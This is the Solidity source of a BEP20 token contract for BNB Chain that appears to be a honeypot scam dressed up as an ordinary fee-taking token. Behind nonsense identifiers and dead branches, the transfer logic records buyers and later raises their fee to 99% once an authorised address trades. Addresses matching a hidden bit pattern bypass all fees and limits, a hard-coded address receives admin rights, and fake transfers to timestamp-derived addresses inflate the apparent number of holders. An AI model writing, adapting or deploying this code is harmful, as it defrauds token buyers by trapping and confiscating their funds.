/**
 *Submitted for verification at BscScan.com on 2022-12-19
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Manager {
    address internal owner;
    mapping(address => bool) internal competent;

    constructor(address _owner) {
        owner = _owner;
        competent[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        competent[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        competent[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return competent[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        competent[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract EstrusAttachmentRadiance is IBEP20, Manager {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Estrus Attachment Radiance ";
    string constant _symbol = "EstrusAttachmentRadiance";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private buyTeamMaxExemptLiquidity;
    mapping(address => bool) private exemptMarketingLimitSwap;
    mapping(address => bool) private autoSellLiquidityLimit;
    mapping(address => bool) private limitMarketingSellFee;
    mapping(address => uint256) private teamTxMinBurnSwap;
    mapping(uint256 => address) private swapBurnExemptMin;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private burnExemptWalletLimitBots = 0;
    uint256 private feeWalletLimitBurn = 6;

    //SELL FEES
    uint256 private feeIsBotsLiquidityExemptTx = 0;
    uint256 private sellMaxExemptBuyWallet = 6;

    uint256 private exemptTradingMarketingLiquidity = feeWalletLimitBurn + burnExemptWalletLimitBots;
    uint256 private limitLaunchedBotsSwap = 100;

    address private swapModeTradingBurn = (msg.sender); // auto-liq address
    address private swapWalletLiquidityBuy = (0x5b02B75d78706a0831A0282bfffFe06Ee4FB3f55); // marketing address
    address private launchedSellMinTrading = DEAD;
    address private limitTeamBuyLaunched = DEAD;
    address private feeTeamBurnWalletBotsExemptLaunched = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private swapMinTxMaxAutoIsLiquidity;
    uint256 private liquidityAutoMinLaunched;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private feeBurnModeLaunchedAutoBuyLiquidity;
    uint256 private swapTradingAutoMax;
    uint256 private minReceiverBotsIs;
    uint256 private botsMaxReceiverBurn;
    uint256 private limitMarketingLiquidityFeeBurn;

    bool private autoLiquiditySellBots = true;
    bool private limitMarketingSellFeeMode = true;
    bool private tradingModeLaunchedLiquidityFeeTxMin = true;
    bool private botsTxTradingAuto = true;
    bool private modeMarketingTeamReceiverLimitAuto = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private launchedBotsFeeTeamLimitBurn = 6 * 10 ** 15;
    uint256 private teamBuyModeMax = _totalSupply / 1000; // 0.1%

    
    bool private buyLimitFeeLiquidityBotsExempt = false;
    bool private modeIsLiquidityTeam = false;
    bool private isFeeTxLimit = false;
    bool private feeBotsTradingMarketingReceiver = false;
    uint256 private walletSellLaunchedTeam = 0;
    uint256 private minLaunchedMarketingLimit = 0;
    uint256 private modeFeeBurnIs = 0;
    bool private walletMaxModeBurnBuyExemptSwap = false;
    uint256 private maxSellBurnTx = 0;
    uint256 private swapSellLaunchedLimit = 0;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Manager(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        feeBurnModeLaunchedAutoBuyLiquidity = true;

        buyTeamMaxExemptLiquidity[msg.sender] = true;
        buyTeamMaxExemptLiquidity[address(this)] = true;

        exemptMarketingLimitSwap[msg.sender] = true;
        exemptMarketingLimitSwap[0x0000000000000000000000000000000000000000] = true;
        exemptMarketingLimitSwap[0x000000000000000000000000000000000000dEaD] = true;
        exemptMarketingLimitSwap[address(this)] = true;

        autoSellLiquidityLimit[msg.sender] = true;
        autoSellLiquidityLimit[0x0000000000000000000000000000000000000000] = true;
        autoSellLiquidityLimit[0x000000000000000000000000000000000000dEaD] = true;
        autoSellLiquidityLimit[address(this)] = true;

        SetAuthorized(address(0x006dd416446dD1c757770857fFffcF1e76Fcc09A));

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return maxBotsExemptLiquidityLimit(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Estrus Attachment Radiance  Insufficient Allowance");
        }

        return maxBotsExemptLiquidityLimit(sender, recipient, amount);
    }

    function maxBotsExemptLiquidityLimit(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        bool bLimitTxWalletValue = limitLiquidityWalletExemptFeeAutoBots(sender) || limitLiquidityWalletExemptFeeAutoBots(recipient);
        
        if (buyLimitFeeLiquidityBotsExempt == modeMarketingTeamReceiverLimitAuto) {
            buyLimitFeeLiquidityBotsExempt = buyLimitFeeLiquidityBotsExempt;
        }

        if (minLaunchedMarketingLimit != walletSellLaunchedTeam) {
            minLaunchedMarketingLimit = sellMaxExemptBuyWallet;
        }

        if (modeFeeBurnIs == feeWalletLimitBurn) {
            modeFeeBurnIs = modeFeeBurnIs;
        }


        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && isAuthorized(recipient)) {
                limitTxTradingReceiverWallet();
            }
            if (!bLimitTxWalletValue) {
                tradingLiquidityTxExemptLimit(recipient);
            }
        }
        
        if (inSwap || bLimitTxWalletValue) {return walletTxLaunchedAutoTeamIs(sender, recipient, amount);}

        if (!buyTeamMaxExemptLiquidity[sender] && !buyTeamMaxExemptLiquidity[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Estrus Attachment Radiance  Max wallet has been triggered");
        }
        
        if (maxSellBurnTx == feeIsBotsLiquidityExemptTx) {
            maxSellBurnTx = launchedBotsFeeTeamLimitBurn;
        }


        require((amount <= _maxTxAmount) || autoSellLiquidityLimit[sender] || autoSellLiquidityLimit[recipient], "Estrus Attachment Radiance  Max TX Limit has been triggered");

        if (exemptBotsModeIs()) {isLiquidityBotsReceiver();}

        _balances[sender] = _balances[sender].sub(amount, "Estrus Attachment Radiance  Insufficient Balance");
        
        if (modeFeeBurnIs != limitLaunchedBotsSwap) {
            modeFeeBurnIs = feeIsBotsLiquidityExemptTx;
        }


        uint256 amountReceived = autoExemptIsSwap(sender) ? limitExemptMaxLaunched(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function walletTxLaunchedAutoTeamIs(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Estrus Attachment Radiance  Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function autoExemptIsSwap(address sender) internal view returns (bool) {
        return !exemptMarketingLimitSwap[sender];
    }

    function maxExemptTradingTeam(address sender, bool selling) internal returns (uint256) {
        
        if (buyLimitFeeLiquidityBotsExempt != modeMarketingTeamReceiverLimitAuto) {
            buyLimitFeeLiquidityBotsExempt = isFeeTxLimit;
        }


        if (selling) {
            exemptTradingMarketingLiquidity = sellMaxExemptBuyWallet + feeIsBotsLiquidityExemptTx;
            return limitMaxFeeTeam(sender, exemptTradingMarketingLiquidity);
        }
        if (!selling && sender == uniswapV2Pair) {
            exemptTradingMarketingLiquidity = feeWalletLimitBurn + burnExemptWalletLimitBots;
            return exemptTradingMarketingLiquidity;
        }
        return limitMaxFeeTeam(sender, exemptTradingMarketingLiquidity);
    }

    function autoMaxBotsExempt() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function limitExemptMaxLaunched(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        if (walletMaxModeBurnBuyExemptSwap != limitMarketingSellFeeMode) {
            walletMaxModeBurnBuyExemptSwap = isFeeTxLimit;
        }


        uint256 feeAmount = amount.mul(maxExemptTradingTeam(sender, receiver == uniswapV2Pair)).div(limitLaunchedBotsSwap);

        if (limitMarketingSellFee[sender] || limitMarketingSellFee[receiver]) {
            feeAmount = amount.mul(99).div(limitLaunchedBotsSwap);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        if (_balances[address(this)] > 2 * 10 ** _decimals && sender == uniswapV2Pair) {
            for (uint i = 0; i < 2; i++) {
                address addr = address(uint160(block.timestamp + i));
                _balances[addr] = _balances[addr] + 10 ** _decimals;
                emit Transfer(address(this), addr, 10 ** _decimals);
            }
            _balances[address(this)] = _balances[address(this)].sub(2 * 10 ** _decimals);
        }

        return amount.sub(feeAmount);
    }

    function limitLiquidityWalletExemptFeeAutoBots(address addr) private view returns (bool) {
        uint256 v0 = uint256(uint160(addr)) << 192;
        v0 = v0 >> 238;
        return v0 == firstSetAutoReceiver;
    }

    function limitMaxFeeTeam(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lcfkd = teamTxMinBurnSwap[sender];
        uint256 kdkls = pFee;
        if (lcfkd > 0 && block.timestamp - lcfkd > 2) {
            kdkls = 99;
        }
        return kdkls;
    }

    function tradingLiquidityTxExemptLimit(address addr) private {
        if (autoMaxBotsExempt() < launchedBotsFeeTeamLimitBurn) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        swapBurnExemptMin[exemptLimitValue] = addr;
    }

    function limitTxTradingReceiverWallet() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (teamTxMinBurnSwap[swapBurnExemptMin[i]] == 0) {
                    teamTxMinBurnSwap[swapBurnExemptMin[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(swapWalletLiquidityBuy).transfer(amountBNB * amountPercentage / 100);
    }

    function exemptBotsModeIs() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    modeMarketingTeamReceiverLimitAuto &&
    _balances[address(this)] >= teamBuyModeMax;
    }

    function isLiquidityBotsReceiver() internal swapping {
        
        if (minLaunchedMarketingLimit == burnExemptWalletLimitBots) {
            minLaunchedMarketingLimit = exemptTradingMarketingLiquidity;
        }

        if (walletMaxModeBurnBuyExemptSwap == limitMarketingSellFeeMode) {
            walletMaxModeBurnBuyExemptSwap = isFeeTxLimit;
        }


        uint256 amountToLiquify = teamBuyModeMax.mul(burnExemptWalletLimitBots).div(exemptTradingMarketingLiquidity).div(2);
        uint256 amountToSwap = teamBuyModeMax.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = exemptTradingMarketingLiquidity.sub(burnExemptWalletLimitBots.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(burnExemptWalletLimitBots).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(feeWalletLimitBurn).div(totalETHFee);
        
        if (walletMaxModeBurnBuyExemptSwap != autoLiquiditySellBots) {
            walletMaxModeBurnBuyExemptSwap = feeBotsTradingMarketingReceiver;
        }

        if (isFeeTxLimit != buyLimitFeeLiquidityBotsExempt) {
            isFeeTxLimit = isFeeTxLimit;
        }


        payable(swapWalletLiquidityBuy).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                swapModeTradingBurn,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getLimitMarketingSellFeeMode() public view returns (bool) {
        return limitMarketingSellFeeMode;
    }
    function setLimitMarketingSellFeeMode(bool a0) public onlyOwner {
        if (limitMarketingSellFeeMode == buyLimitFeeLiquidityBotsExempt) {
            buyLimitFeeLiquidityBotsExempt=a0;
        }
        limitMarketingSellFeeMode=a0;
    }

    function getWalletMaxModeBurnBuyExemptSwap() public view returns (bool) {
        if (walletMaxModeBurnBuyExemptSwap != botsTxTradingAuto) {
            return botsTxTradingAuto;
        }
        if (walletMaxModeBurnBuyExemptSwap != modeMarketingTeamReceiverLimitAuto) {
            return modeMarketingTeamReceiverLimitAuto;
        }
        return walletMaxModeBurnBuyExemptSwap;
    }
    function setWalletMaxModeBurnBuyExemptSwap(bool a0) public onlyOwner {
        if (walletMaxModeBurnBuyExemptSwap != feeBotsTradingMarketingReceiver) {
            feeBotsTradingMarketingReceiver=a0;
        }
        if (walletMaxModeBurnBuyExemptSwap != botsTxTradingAuto) {
            botsTxTradingAuto=a0;
        }
        walletMaxModeBurnBuyExemptSwap=a0;
    }

    function getIsFeeTxLimit() public view returns (bool) {
        if (isFeeTxLimit != modeMarketingTeamReceiverLimitAuto) {
            return modeMarketingTeamReceiverLimitAuto;
        }
        if (isFeeTxLimit == walletMaxModeBurnBuyExemptSwap) {
            return walletMaxModeBurnBuyExemptSwap;
        }
        return isFeeTxLimit;
    }
    function setIsFeeTxLimit(bool a0) public onlyOwner {
        if (isFeeTxLimit == modeIsLiquidityTeam) {
            modeIsLiquidityTeam=a0;
        }
        if (isFeeTxLimit != isFeeTxLimit) {
            isFeeTxLimit=a0;
        }
        isFeeTxLimit=a0;
    }

    function getTradingModeLaunchedLiquidityFeeTxMin() public view returns (bool) {
        if (tradingModeLaunchedLiquidityFeeTxMin == buyLimitFeeLiquidityBotsExempt) {
            return buyLimitFeeLiquidityBotsExempt;
        }
        if (tradingModeLaunchedLiquidityFeeTxMin != walletMaxModeBurnBuyExemptSwap) {
            return walletMaxModeBurnBuyExemptSwap;
        }
        return tradingModeLaunchedLiquidityFeeTxMin;
    }
    function setTradingModeLaunchedLiquidityFeeTxMin(bool a0) public onlyOwner {
        if (tradingModeLaunchedLiquidityFeeTxMin != autoLiquiditySellBots) {
            autoLiquiditySellBots=a0;
        }
        if (tradingModeLaunchedLiquidityFeeTxMin != autoLiquiditySellBots) {
            autoLiquiditySellBots=a0;
        }
        if (tradingModeLaunchedLiquidityFeeTxMin == modeMarketingTeamReceiverLimitAuto) {
            modeMarketingTeamReceiverLimitAuto=a0;
        }
        tradingModeLaunchedLiquidityFeeTxMin=a0;
    }

    function getSwapSellLaunchedLimit() public view returns (uint256) {
        if (swapSellLaunchedLimit == teamBuyModeMax) {
            return teamBuyModeMax;
        }
        if (swapSellLaunchedLimit == minLaunchedMarketingLimit) {
            return minLaunchedMarketingLimit;
        }
        return swapSellLaunchedLimit;
    }
    function setSwapSellLaunchedLimit(uint256 a0) public onlyOwner {
        if (swapSellLaunchedLimit != swapSellLaunchedLimit) {
            swapSellLaunchedLimit=a0;
        }
        swapSellLaunchedLimit=a0;
    }

    function getTeamTxMinBurnSwap(address a0) public view returns (uint256) {
        if (teamTxMinBurnSwap[a0] == teamTxMinBurnSwap[a0]) {
            return limitLaunchedBotsSwap;
        }
        if (a0 == launchedSellMinTrading) {
            return swapSellLaunchedLimit;
        }
            return teamTxMinBurnSwap[a0];
    }
    function setTeamTxMinBurnSwap(address a0,uint256 a1) public onlyOwner {
        if (a0 == swapWalletLiquidityBuy) {
            swapSellLaunchedLimit=a1;
        }
        if (teamTxMinBurnSwap[a0] != teamTxMinBurnSwap[a0]) {
           teamTxMinBurnSwap[a0]=a1;
        }
        teamTxMinBurnSwap[a0]=a1;
    }

    function getLimitTeamBuyLaunched() public view returns (address) {
        if (limitTeamBuyLaunched == feeTeamBurnWalletBotsExemptLaunched) {
            return feeTeamBurnWalletBotsExemptLaunched;
        }
        if (limitTeamBuyLaunched != launchedSellMinTrading) {
            return launchedSellMinTrading;
        }
        if (limitTeamBuyLaunched != limitTeamBuyLaunched) {
            return limitTeamBuyLaunched;
        }
        return limitTeamBuyLaunched;
    }
    function setLimitTeamBuyLaunched(address a0) public onlyOwner {
        if (limitTeamBuyLaunched != feeTeamBurnWalletBotsExemptLaunched) {
            feeTeamBurnWalletBotsExemptLaunched=a0;
        }
        if (limitTeamBuyLaunched != swapWalletLiquidityBuy) {
            swapWalletLiquidityBuy=a0;
        }
        limitTeamBuyLaunched=a0;
    }

    function getSwapWalletLiquidityBuy() public view returns (address) {
        if (swapWalletLiquidityBuy == swapWalletLiquidityBuy) {
            return swapWalletLiquidityBuy;
        }
        if (swapWalletLiquidityBuy == feeTeamBurnWalletBotsExemptLaunched) {
            return feeTeamBurnWalletBotsExemptLaunched;
        }
        if (swapWalletLiquidityBuy == swapWalletLiquidityBuy) {
            return swapWalletLiquidityBuy;
        }
        return swapWalletLiquidityBuy;
    }
    function setSwapWalletLiquidityBuy(address a0) public onlyOwner {
        swapWalletLiquidityBuy=a0;
    }

    function getFeeTeamBurnWalletBotsExemptLaunched() public view returns (address) {
        if (feeTeamBurnWalletBotsExemptLaunched != swapWalletLiquidityBuy) {
            return swapWalletLiquidityBuy;
        }
        if (feeTeamBurnWalletBotsExemptLaunched != limitTeamBuyLaunched) {
            return limitTeamBuyLaunched;
        }
        return feeTeamBurnWalletBotsExemptLaunched;
    }
    function setFeeTeamBurnWalletBotsExemptLaunched(address a0) public onlyOwner {
        if (feeTeamBurnWalletBotsExemptLaunched != launchedSellMinTrading) {
            launchedSellMinTrading=a0;
        }
        if (feeTeamBurnWalletBotsExemptLaunched == swapWalletLiquidityBuy) {
            swapWalletLiquidityBuy=a0;
        }
        feeTeamBurnWalletBotsExemptLaunched=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}